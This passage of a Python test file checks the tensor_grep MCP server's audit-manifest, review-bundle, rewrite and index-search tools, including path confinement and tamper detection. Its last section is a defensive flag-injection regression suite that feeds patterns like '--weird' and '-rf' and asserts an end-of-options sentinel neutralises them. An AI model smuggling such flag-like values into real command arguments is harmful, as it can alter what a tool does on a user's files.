    _assert_audit_manifest_envelope(payload, routing_reason="audit-manifest-history")
    assert payload["history"] == audit_manifest.list_audit_history(project)


def test_tg_audit_history_returns_empty_array_for_empty_directory(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    (project / ".tensor-grep" / "audit").mkdir(parents=True)

    payload = json.loads(mcp_server.tg_audit_history(str(project)))

    _assert_audit_manifest_envelope(payload, routing_reason="audit-manifest-history")
    assert payload["history"] == []


def test_tg_audit_diff_matches_cli_json_schema(tmp_path, monkeypatch):
    from tensor_grep.cli import audit_manifest, mcp_server

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #7)
    left_path = tmp_path / "left.json"
    right_path = tmp_path / "right.json"
    _write_audit_manifest(left_path)
    right_payload = _write_audit_manifest(right_path)
    right_payload["kind"] = "rewrite-plan-manifest"
    right_payload["reviewer"] = "alice"
    right_payload["files"][0]["after_sha256"] = "c" * 64
    right_payload["manifest_sha256"] = hashlib.sha256(
        _canonical_manifest_bytes(right_payload)
    ).hexdigest()
    right_path.write_text(json.dumps(right_payload, indent=2), encoding="utf-8")

    payload = json.loads(mcp_server.tg_audit_diff(str(left_path), str(right_path)))

    _assert_audit_manifest_envelope(payload, routing_reason="audit-manifest-diff")
    assert payload["added"] == {"reviewer": "alice"}
    assert payload["removed"] == {}
    assert (
        payload["changed"] == audit_manifest.diff_audit_manifests(left_path, right_path)["changed"]
    )


def test_tg_audit_diff_reports_not_found(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #7)
    missing_left = tmp_path / "missing-left.json"
    missing_right = tmp_path / "missing-right.json"

    out = mcp_server.tg_audit_diff(str(missing_left), str(missing_right))

    parsed = json.loads(out)
    assert parsed["routing_reason"] == "audit-manifest-diff"
    assert parsed["error"]["code"] == "not_found"


def test_tg_audit_diff_reports_invalid_json(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #7)
    left_path = tmp_path / "left.json"
    right_path = tmp_path / "right.json"
    _write_audit_manifest(left_path)
    right_path.write_text("{not valid json", encoding="utf-8")

    out = mcp_server.tg_audit_diff(str(left_path), str(right_path))

    parsed = json.loads(out)
    assert parsed["routing_reason"] == "audit-manifest-diff"
    assert parsed["error"]["code"] == "invalid_json"


def test_tg_audit_manifest_verify_reports_invalid_input_for_empty_path():
    from tensor_grep.cli import mcp_server

    out = mcp_server.tg_audit_manifest_verify("")

    parsed = json.loads(out)
    assert parsed["routing_reason"] == "audit-manifest-verify"
    assert parsed["error"]["code"] == "invalid_input"


def test_tg_audit_manifest_verify_reports_chain_failure(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #7)
    previous_manifest_path = tmp_path / "previous-audit.json"
    _write_audit_manifest(previous_manifest_path)
    manifest_path = tmp_path / "rewrite-audit.json"
    wrong_previous = "f" * 64
    _write_audit_manifest(manifest_path, previous_manifest_sha256=wrong_previous)

    out = mcp_server.tg_audit_manifest_verify(
        str(manifest_path),
        previous_manifest=str(previous_manifest_path),
    )

    parsed = json.loads(out)
    assert parsed["checks"]["digest_valid"] is True
    assert parsed["checks"]["chain_valid"] is False
    assert parsed["checks"]["signature_valid"] is True
    assert parsed["valid"] is False
    assert "Previous manifest digest does not match previous_manifest_sha256." in parsed["errors"]


def test_tg_review_bundle_create_matches_bundle_schema(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server
    from tensor_grep.cli.checkpoint_store import create_checkpoint

    project = tmp_path / "project"
    audit_dir = project / ".tensor-grep" / "audit"
    audit_dir.mkdir(parents=True)
    (project / "src").mkdir(parents=True)
    (project / "src" / "sample.py").write_text("print('hello')\n", encoding="utf-8")
    monkeypatch.chdir(project)  # cwd = the read-path confinement anchor (audit #7)

    previous_path = audit_dir / "previous.json"
    previous_payload = _write_audit_manifest(previous_path, project_root=project)
    current_path = audit_dir / "current.json"
    _write_audit_manifest(
        current_path,
        previous_manifest_sha256=str(previous_payload["manifest_sha256"]),
        project_root=project,
    )
    scan_path = project / "scan.json"
    scan_payload = _write_scan_results(scan_path)
    checkpoint = create_checkpoint(str(project))

    out = mcp_server.tg_review_bundle_create(
        manifest_path=str(current_path),
        scan_path=str(scan_path),
        checkpoint_id=checkpoint.checkpoint_id,
        previous_manifest=str(previous_path),
    )

    parsed = json.loads(out)
    assert parsed["routing_reason"] == "review-bundle-create"
    assert parsed["scan_results"] == scan_payload
    assert parsed["checkpoint_metadata"]["checkpoint_id"] == checkpoint.checkpoint_id
    assert parsed["diff"]["changed"]["previous_manifest_sha256"] == {
        "old": None,
        "new": previous_payload["manifest_sha256"],
    }


def test_tg_review_bundle_verify_reports_invalid_integrity(tmp_path, monkeypatch):
    from tensor_grep.cli import audit_manifest as audit_manifest_module
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #7)
    project = tmp_path / "project"
    audit_dir = project / ".tensor-grep" / "audit"
    audit_dir.mkdir(parents=True)
    (project / "src").mkdir(parents=True)
    (project / "src" / "sample.py").write_text("print('hello')\n", encoding="utf-8")
    manifest_path = audit_dir / "current.json"
    _write_audit_manifest(manifest_path, project_root=project)
    bundle_path = tmp_path / "review-bundle.json"
    audit_manifest_module.create_review_bundle(manifest_path, output_path=bundle_path)

    tampered = json.loads(bundle_path.read_text(encoding="utf-8"))
    tampered["bundle_sha256"] = "0" * 64
    bundle_path.write_text(json.dumps(tampered, indent=2), encoding="utf-8")

    out = mcp_server.tg_review_bundle_verify(str(bundle_path))

    parsed = json.loads(out)
    assert parsed["routing_reason"] == "review-bundle-verify"
    assert parsed["checks"]["audit_manifest"]["valid"] is True
    assert parsed["bundle_integrity"]["valid"] is False
    assert parsed["valid"] is False


def test_tg_rewrite_diff_wraps_unified_diff_with_routing_metadata():
    from tensor_grep.cli import mcp_server

    diff_preview = "--- a/file.py\n+++ b/file.py\n@@ -1,1 +1,1 @@\n-old\n+new\n"

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=diff_preview,
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_diff(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
        )

    parsed = json.loads(out)
    assert parsed["routing_backend"] == "AstBackend"
    assert parsed["routing_reason"] == "ast-native"
    assert parsed["sidecar_used"] is False
    assert parsed["diff"] == diff_preview
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv.
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--diff",
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((Path.cwd() / "src").resolve()),
    ]


def test_tg_rewrite_plan_returns_structured_error_for_missing_path():
    from tensor_grep.cli import mcp_server

    # round-8 (audit #95): an absolute out-of-cwd path is now refused by CONFINEMENT before
    # ever reaching the "Path not found" existence check this test exercises -- use a
    # relative, in-root-but-nonexistent path so the existence check is still what fires.
    out = mcp_server.tg_rewrite_plan(
        pattern="def $F($$$ARGS): return $EXPR",
        replacement="lambda $$$ARGS: $EXPR",
        lang="python",
        path="definitely-missing-for-mcp-server-tests",
    )

    parsed = json.loads(out)
    assert parsed["routing_backend"] == "AstBackend"
    assert parsed["routing_reason"] == "ast-native"
    assert parsed["error"]["code"] == "invalid_input"
    assert "Path not found" in parsed["error"]["message"]
    assert "Traceback" not in parsed["error"]["message"]


def test_tg_index_search_returns_native_index_search_json_shape():
    from tensor_grep.cli import mcp_server

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "TrigramIndex",
        "routing_reason": "index-accelerated",
        "sidecar_used": False,
        "query": "ERROR",
        "path": "src",
        "total_matches": 1,
        "matches": [
            {
                "file": "C:/tmp/sample.log",
                "line": 2,
                "text": "ERROR database failed",
            }
        ],
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_index_search(pattern="ERROR", path="src")

    parsed = json.loads(out)
    # audit A4: tolerate the added mcp_contract_version envelope key.
    assert _project_onto(parsed, payload) == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv.
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "search",
        "--index",
        "--json",
        "--",
        "ERROR",
        str((Path.cwd() / "src").resolve()),
    ]


def test_tg_index_search_returns_structured_error_for_missing_path():
    from tensor_grep.cli import mcp_server

    # round-8 (audit #95): an absolute out-of-cwd path is now refused by CONFINEMENT before
    # ever reaching the "Path not found" existence check this test exercises -- use a
    # relative, in-root-but-nonexistent path so the existence check is still what fires.
    out = mcp_server.tg_index_search(
        pattern="ERROR",
        path="definitely-missing-for-mcp-server-tests",
    )

    parsed = json.loads(out)
    assert parsed["routing_backend"] == "TrigramIndex"
    assert parsed["routing_reason"] == "index-accelerated"
    assert parsed["error"]["code"] == "invalid_input"
    assert "Path not found" in parsed["error"]["message"]
    assert "Traceback" not in parsed["error"]["message"]


# --- round-3 security: native-argv flag-injection sentinel -------------------------
#
# The MCP rewrite/index-search tools build a native `tg` command that ends with the
# user-controlled pattern (and path) as trailing positionals. Without an end-of-options
# `--` sentinel, a pattern beginning with `-` is parsed by the native binary as a flag
# (`error: unexpected argument '--weird' found`) — flag/argv injection AND a latent
# correctness break. Verified against the real binary: `tg search -- --weird PATH` and
# `tg run --lang python --rewrite bar --json -- -x PATH` both parse the value literally.


def test_index_search_command_ends_options_before_user_positionals() -> None:
    from tensor_grep.cli import mcp_server

    cmd = mcp_server._build_index_search_command(
        pattern="--weird", path="/tmp/x", native_binary="/fake/tg"
    )

    assert "--" in cmd, "user positionals must follow an end-of-options sentinel"
    sentinel = cmd.index("--")
    # Everything after `--` is the untrusted pattern/path, in order, and nothing else.
    assert cmd[sentinel + 1 :] == ["--weird", "/tmp/x"]


def test_rewrite_command_ends_options_before_user_positionals() -> None:
    from tensor_grep.cli import mcp_server

    cmd = mcp_server._build_rewrite_command(
        pattern="-x",
        replacement="bar",
        lang="python",
        path="/tmp/x",
        mode="plan",
        native_binary="/fake/tg",
    )

    assert "--" in cmd, "user positionals must follow an end-of-options sentinel"
    sentinel = cmd.index("--")
    assert cmd[sentinel + 1 :] == ["-x", "/tmp/x"]


def test_rewrite_apply_command_still_sentinels_positionals() -> None:
    # The apply mode adds flags (--apply/--verify/--json); the sentinel must still sit
    # immediately before the pattern/path so those flags are unaffected but the user
    # positionals cannot be re-interpreted as flags.
    from tensor_grep.cli import mcp_server

    cmd = mcp_server._build_rewrite_command(
        pattern="-rf",
        replacement="bar",
        lang="python",
        path="/tmp/x",
        mode="apply",
        verify=True,
        native_binary="/fake/tg",
    )

    assert cmd[-3:] == ["--", "-rf", "/tmp/x"]
    assert "--apply" in cmd and "--json" in cmd
